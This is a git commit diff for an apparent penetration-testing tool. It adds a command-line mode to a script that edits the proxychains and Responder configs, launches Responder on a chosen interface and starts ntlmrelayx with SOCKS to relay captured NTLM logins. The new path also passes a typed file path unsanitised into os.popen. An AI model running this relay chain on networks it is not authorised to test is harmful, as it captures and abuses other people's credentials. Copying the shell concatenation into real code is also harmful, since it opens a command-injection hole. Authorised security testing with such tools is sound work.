5a1a33c698c2dab266ffa5606f403b2bf647b4e3
fbarre96 <fbarre96@hotmail.fr>
2024-08-13 13:58:46 +0200

    fix script utils

--- pollenisatorgui/scripts/lan/start_relaying.py
+++ pollenisatorgui/scripts/lan/start_relaying.py
@@ -1,20 +1,20 @@
 import multiprocessing
 import subprocess
-
 import psutil
-from pollenisatorgui.core.components.logger_config import logger
 import pollenisatorgui.core.components.utils as utils
-from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
-from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
 import tempfile
 import os
 import shutil
-import tkinter as tk
 from pollenisatorgui.core.components.apiclient import APIClient
 from pollenisatorgui.scripts.lan.utils import checkPath
-
+from pollenisatorgui.pollex import pollex_exec
 
 def main(apiclient, appli, **kwargs):
+    if appli:
+        from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
+        from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
+        import tkinter as tk
+
     responder_path = utils.which_expand_alias("responder")
     if responder_path is None:
         responder_path = utils.which_expand_alias("Responder.py")
@@ -41,48 +41,87 @@ def main(apiclient, appli, **kwargs):
         os.makedirs(relaying_loot_path)
     except:
         pass
-    dialog = ChildDialogQuestion(None, "Setup proxychains", "Do you want to edit proxychains conf to port 1080 ?")
-    dialog.app.wait_window(dialog.app)
-    cmd = ""
-    if dialog.rvalue == "Yes":
-        cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
-        if os.geteuid() != 0:
-            cmd = "sudo "+cmd
-        appli.launch_in_terminal(None, "sed for proxychains", cmd, use_pollex=False)
+    if appli:
+        dialog = ChildDialogQuestion(None, "Setup proxychains", "Do you want to edit proxychains conf to port 1080 ?")
+        dialog.app.wait_window(dialog.app)
+        cmd = ""
+        if dialog.rvalue == "Yes":
+            cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
+            if os.geteuid() != 0:
+                cmd = "sudo "+cmd
+            appli.launch_in_terminal(None, "sed for proxychains", cmd, use_pollex=False)
+    else:
+        res = input("Do you want to edit proxychains conf to port 1080 ? (Y/n)")
+        if res.lower() == "y":
+            cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
+            if os.geteuid() != 0:
+                cmd = "sudo "+cmd
+            os.popen(cmd)
     responder_conf = ""
     if utils.which_expand_alias("locate"):
         output = multiprocessing.Queue()
         resp = subprocess.run("locate Responder.conf", capture_output=True, text=True, shell=True)
         stdout = resp.stdout
         if stdout.strip() == "":
-            file = tk.filedialog.askopenfilename(title="Locate responder conf file please:", filetypes=[('Config Files', '*.conf')])
-            if file:
-                responder_conf = file
+            if appli:
+                file = tk.filedialog.askopenfilename(title="Locate responder conf file please:", filetypes=[('Config Files', '*.conf')])
+                if file:
+                    responder_conf = file
+                else:
+                    return False, "Responder conf not given"
             else:
-                return False, "Responder conf not given"
+                responder_conf = input("Responder conf not found, give full path to it please:")
+                if responder_conf.strip() == "":
+                    return False, "Responder conf not given"
+            if not os.path.isfile(responder_conf):
+                return False, "Responder conf not found"
         else:
-            dialog = ChildDialogCombo(None, stdout.split("\n"), displayMsg="Choose your responder config file", width=200)
-            dialog.app.wait_window(dialog.app)
-            if dialog.rvalue is not None:
-                responder_conf = dialog.rvalue.strip()
+            if appli:
+                dialog = ChildDialogCombo(None, stdout.split("\n"), displayMsg="Choose your responder config file", width=200)
+                dialog.app.wait_window(dialog.app)
+                if dialog.rvalue is not None:
+                    responder_conf = dialog.rvalue.strip()
+                    if os.geteuid() != 0:
+                        cmd = "sudo "+cmd
+                    cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
+                    appli.launch_in_terminal(None, "sed for responder", cmd, use_pollex=False)
+            else:
+                print("Responder conf found at :")
+                print(stdout.split("\n"))
+                responder_conf = input("Choose your responder config file by its full path:")
+                if responder_conf.strip() == "":
+                    return False, "Responder conf not given"
                 if os.geteuid() != 0:
                     cmd = "sudo "+cmd
                 cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
-                appli.launch_in_terminal(None, "sed for responder", cmd, use_pollex=False)
+                os.popen(cmd)
     addrs = psutil.net_if_addrs()
-    dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
-    dialog.app.wait_window(dialog.app)
-    if dialog.rvalue is None:
-        return False, "No ethernet device chosen"
-    cmd = f"{responder_path} -I {dialog.rvalue} -dvw --lm --disable-ess"
+    if appli:
+        dialog = ChildDialogCombo(None, addrs.keys(), displayMsg="Choose your ethernet device to listen on")
+        dialog.app.wait_window(dialog.app)
+        if dialog.rvalue is None:
+            return False, "No ethernet device chosen"
+        eth = dialog.rvalue
+    else:
+        print("Choose your ethernet device to listen on")
+        print(addrs.keys())
+        eth = input("Choose your ethernet device to listen on (type it):")
+        if eth is None:
+            return False, "No ethernet device chosen"
+    cmd = f"{responder_path} -I {eth} -dvw --lm --disable-ess"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
-    appli.launch_in_terminal(None, "responder", cmd, use_pollex=False)
-
+    if appli:
+        appli.launch_in_terminal(None, "responder", cmd, use_pollex=False)
+    else:
+        os.popen(cmd+"&")
     cmd = f"{path} -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
     if os.geteuid() != 0:
         cmd = "sudo "+cmd
-    appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for responder", cmd, use_pollex=False)
+    if appli:
+        appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for responder", cmd, use_pollex=False)
+    else:
+        pollex_exec(cmd, verbose=False)
     return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
             "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                 "Proxychains port should be 1080 (default)"
--- pollenisatorgui/scripts/lan/utils.py
+++ pollenisatorgui/scripts/lan/utils.py
@@ -1,8 +1,7 @@
-from pollenisatorgui.core.application.dialogs.ChildDialogAskText import ChildDialogAskText
 from pollenisatorgui.core.components import utils
 
 
-def findDc(apiclient, domain=None, ask_if_fail=True):
+def findDc(apiclient, domain=None, ask_if_fail=True, graphical=False):
     search = {"type":"computer", "infos.is_dc":True}
     if domain is not None:
         search["domain"] = domain
@@ -10,9 +9,13 @@ def findDc(apiclient, domain=None, ask_if_fail=True):
     if dc_info is None:
         if not ask_if_fail:
             return False, "DC not known"
-        dialog = ChildDialogAskText(None, "DC not known, give me IP if you know it", multiline=False)
-        dialog.app.wait_window(dialog.app)
-        dc = dialog.rvalue
+        if graphical:
+            from pollenisatorgui.core.application.dialogs.ChildDialogAskText import ChildDialogAskText
+            dialog = ChildDialogAskText(None, "DC not known, give me its IP if you know it", multiline=False)
+            dialog.app.wait_window(dialog.app)
+            dc = dialog.rvalue
+        else:
+            dc = input("DC not found, give me its IP if you know it:")
     else:
         dc = dc_info.get("ip")
     if dc is None or dc == "":
